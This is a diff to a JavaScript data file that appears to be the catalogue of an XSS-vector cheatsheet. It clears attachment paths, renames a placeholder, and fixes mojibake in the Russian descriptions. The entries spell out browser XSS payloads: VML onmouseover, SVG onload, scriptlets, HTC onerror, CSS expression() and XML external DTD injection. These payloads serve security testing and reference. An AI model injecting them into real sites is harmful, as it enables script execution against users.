@@ -1039,7 +1039,7 @@ var items =
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '0',            
-            'path'          : 'http://heideri.ch/jso/test.vml',
+            'path'          : '',
             'name'          : 'test.vml',
             'raw'           : '<xml>\r\n\t<rect style="height:100%;width:100%" id="xss" onmouseover="%js_alert%" strokecolor="white" strokeweight="2000px" filled="false" />\r\n</xml>'
         },
@@ -1314,12 +1314,12 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '<?xml version="1.0" standalone="no"?><html xmlns="http://www.w3.org/1999/xhtml"><head><style type="text/css">@font-face {font-family: y; src: url("%svg_font_path%#x") format("svg");} body {font: 100px "y";}</style></head><body>Hello</body></html>',
+        'data'       : '<?xml version="1.0" standalone="no"?><html xmlns="http://www.w3.org/1999/xhtml"><head><style type="text/css">@font-face {font-family: y; src: url("%svg_path%#x") format("svg");} body {font: 100px "y";}</style></head><body>Hello</body></html>',
         'attachment' : {
             'required_mime' : 'image/svg+xml',
-            'samedomain'    : '1',            
-            'path'          : 'http://heideri.ch/jso/font.svg',
-            'name'          : 'font.svg',
+            'samedomain'    : '',            
+            'path'          : '',
+            'name'          : '',
             'raw'           : '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="%js_alert%" xmlns="http://www.w3.org/2000/svg"><defs><font id="x"><font-face font-family="y"/></font></defs></svg>'
         },
         'description': {
@@ -1616,7 +1616,7 @@ var items =
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '1',            
-            'path'          : 'http://heideri.ch/jso/test.sct',
+            'path'          : '',
             'name'          : 'test.sct',
             'raw'           : '<SCRIPTLET>\r\n\t<IMPLEMENTS Type="Behavior"></IMPLEMENTS>\r\n\t<SCRIPT Language="javascript">%js_alert%</SCRIPT>\r\n</SCRIPTLET>'
         },        
@@ -1652,7 +1652,7 @@ var items =
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '1',            
-            'path'          : 'http://heideri.ch/jso/test.htc',
+            'path'          : '',
             'name'          : 'test.htc',
             'raw'           : '<?xml version="1.0"?>\r\n<x>\r\n<payload><![CDATA[<img src=x onerror=%js_alert%>]]></payload>\r\n</x>'
         },        
@@ -2015,7 +2015,7 @@ var items =
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '1',            
-            'path'          : 'http://heideri.ch/jso/test.xxe',
+            'path'          : '',
             'name'          : '',
             'raw'           : '<script xmlns="http://www.w3.org/1999/xhtml">%js_alert%</script>'
         },
@@ -2378,7 +2378,7 @@ var items =
         'name'       : {
             'en' : 'Arbitrary payload injection via XML external DTD in IE',
             'ja' : '',
-            'ru' : 'Èíúåêöèÿ óäàëåííîãî javascript-êîäà ÷åðåç âíåøíåå îïðåäåëåíèå òèïà äîêóìåíòà (DTD)',
+            'ru' : 'Инъекция удаленного javascript-кода через внешнее определение типа документа (DTD)',
             'de' : ''
         },
         'data'       : '<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>',
@@ -2392,7 +2392,7 @@ var items =
         'description': {
             'en' : 'IE requires to display html-tags of any users stylesheet and namespace prefix "html".',
             'ja' : '',
-            'ru' : 'IE äëÿ îòîáðàæåíèÿ HTML-òåãîâ òðåáóåò îáÿçàòåëüíîãî íàëè÷èÿ íà xml-ñòðàíèöå ïîëüçîâàòåëüñêîé òàáëèöû ñòèëåé, à òàêæå îáúÿâëåíèÿ ñîîòâåòñòâóþùåãî ïðîñòðàíñòâà èìåí ñ ïðåôèêñîì "html".',
+            'ru' : 'IE для отображения HTML-тегов требует обязательного наличия на xml-странице пользовательской таблицы стилей, а также объявления соответствующего пространства имен с префиксом "html".',
             'de' : ''
         },
         'urls'    : [],
@@ -2414,14 +2414,14 @@ var items =
         'name'       : {
             'en' : 'XML JavaScript execution via style attribute in IE',
             'ja' : '',
-            'ru' : 'Âûïîëíåíèå javascript c ïîìîùüþ ñòèëåâîãî àòðèáóòà â IE íà XML-ñòðàíèöå',
+            'ru' : 'Выполнение javascript c помощью стилевого атрибута в IE на XML-странице',
             'de' : ''
         },
         'data'       : '<?xml-stylesheet type="text/css"?><root style="x:expression(%js_write%)"/>',
         'description': {
             'en' : 'IE supports the style attribute to the xml-pages. So JavaScript can be executed in any tag.',
             'ja' : '',
-            'ru' : 'IE ïîääåðæèâàåò ñòèëåâîé àòðèáóò íà xml-ñòðàíèöàõ. Òàêèì îáðàçîì, ÿâàñêèïò ìîæåò áûòü âûïîëíåí â ëþáîì òåãå.',
+            'ru' : 'IE поддерживает стилевой атрибут на xml-страницах. Таким образом, яваскипт может быть выполнен в любом теге.',
             'de' : ''
         },
         'urls'    : [],
@@ -2443,7 +2443,7 @@ var items =
         'name'       : {
             'en' : 'Arbitrary payload injection via XSL + XDR-schema in IE',
             'ja' : '',
-            'ru' : 'Èíúåêöèÿ óäàëåííîãî javascript-êîäà â IE ñ ïîìîùüþ XSL è XDR-ñõåìû',
+            'ru' : 'Инъекция удаленного javascript-кода в IE с помощью XSL и XDR-схемы',
             'de' : ''
         },
         'data'       : '<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:xdrtest.xml"/>',
@@ -2457,7 +2457,7 @@ var items =
         'description': {
             'en' : 'The namespace "html" is automatically determined using XSL. Missing attributes for the "img" tag is obtained from the XDR-schema.',
             'ja' : '',
-            'ru' : 'Ïðîñòðàíñòâî èìåí "html" àâòîìàòè÷åñêè îïðåäåëÿåòñÿ IE ñ ïîìîùüþ XSL-òàáëèöû. Íåäîñòàþùèå àòðèáóòû äëÿ òåãà "img" çàèìñòâóþòñÿ èç XDR-ñõåìû.',
+            'ru' : 'Пространство имен "html" автоматически определяется IE с помощью XSL-таблицы. Недостающие атрибуты для тега "img" заимствуются из XDR-схемы.',
             'de' : ''
         },
         'urls'    : ['http://msdn.microsoft.com/en-us/library/ms256208(v=VS.100).aspx'],
